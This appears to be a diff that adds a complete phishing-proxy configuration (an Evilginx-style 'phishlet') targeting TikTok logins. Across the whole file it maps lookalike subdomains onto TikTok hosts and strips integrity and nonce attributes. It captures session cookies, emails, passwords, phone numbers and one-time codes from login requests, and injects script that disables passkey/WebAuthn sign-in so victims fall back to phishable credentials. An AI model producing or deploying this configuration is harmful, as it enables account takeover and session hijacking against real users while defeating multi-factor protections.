@@ -1,0 +1,74 @@
+min_ver: '3.0.0'
+author: '0fukuAkz'
+
+proxy_hosts:
+  - {phish_sub: 'tiktok', orig_sub: 'www', domain: 'tiktok.com', session: true, is_landing: true, auto_filter: true}
+  # Login-page JS bundle CDN
+  - {phish_sub: 'ttwlogin', orig_sub: 'sf16-website-login.neutral', domain: 'ttwstatic.com', session: false, is_landing: false, auto_filter: true}
+  # General website static assets
+  - {phish_sub: 'ttwweb', orig_sub: 'sf16-website.neutral', domain: 'ttwstatic.com', session: false, is_landing: false, auto_filter: true}
+  # Image / avatar CDN
+  - {phish_sub: 'p16cdn', orig_sub: 'p16-sign-va', domain: 'tiktokcdn.com', session: false, is_landing: false, auto_filter: false}
+
+sub_filters:
+  - {triggers_on: 'www.tiktok.com', orig_sub: 'www', domain: 'tiktok.com', search: ' integrity="[^"]*"', replace: '', mimes: ['text/html']}
+  - {triggers_on: 'www.tiktok.com', orig_sub: 'www', domain: 'tiktok.com', search: ' integrity=''[^'']*''', replace: '', mimes: ['text/html']}
+  - {triggers_on: 'www.tiktok.com', orig_sub: 'www', domain: 'tiktok.com', search: ' nonce="[^"]*"', replace: '', mimes: ['text/html']}
+  - {triggers_on: 'www.tiktok.com', orig_sub: 'www', domain: 'tiktok.com', search: ' nonce=''[^'']*''', replace: '', mimes: ['text/html']}
+  - {triggers_on: 'www.tiktok.com', orig_sub: 'www', domain: 'tiktok.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'www.tiktok.com', orig_sub: 'sf16-website-login.neutral', domain: 'ttwstatic.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'www.tiktok.com', orig_sub: 'sf16-website.neutral', domain: 'ttwstatic.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+
+auth_tokens:
+  - domain: '.tiktok.com'
+    keys: ['sessionid', 'sessionid_ss,opt', 'ttwid,opt', 'tt_csrf_token,opt', 'msToken,opt', 'passport_csrf_token,opt', 'store-idc,opt', 'store-country-code,opt', 'cmpl_token,opt', 'tt_chain_token,opt']
+    type: 'cookie'
+
+credentials:
+  username:
+    key: 'email'
+    search: '(.*)'
+    type: 'post'
+
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+
+  custom:
+    # Phone-based login
+    - {key: 'mobile', search: '(.*)', type: 'post'}
+    # OTP / verification codes
+    - {key: 'code', search: '(.*)', type: 'post'}
+    - {key: 'captcha', search: '(.*)', type: 'post'}
+    # TikTok passport mix_mode flag
+    - {key: 'mix_mode', search: '(.*)', type: 'post'}
+
+auth_urls:
+  - '/passport/web/account/login/'
+  - '/passport/web/email/login/'
+  - '/passport/email/login/'
+  - '/api/v2/account/profile/'
+  - '/foryou'
+
+js_inject:
+  - trigger_domains: ['www.tiktok.com']
+    trigger_paths: ['/login.*', '/']
+    script: |
+      (function(){
+        if(window.PublicKeyCredential){
+          window.PublicKeyCredential.isUserVerifyingPlatformAuthenticatorAvailable=function(){return Promise.resolve(false);};
+          window.PublicKeyCredential.isConditionalMediationAvailable=function(){return Promise.resolve(false);};
+        }
+        if(navigator.credentials&&navigator.credentials.get){
+          var _orig=navigator.credentials.get.bind(navigator.credentials);
+          navigator.credentials.get=function(o){
+            if(o&&o.publicKey)return Promise.reject(new DOMException('Not allowed','NotAllowedError'));
+            return _orig(o);
+          };
+        }
+      })();
+
+login:
+  domain: 'www.tiktok.com'
+  path: '/login/phone-or-email/email'
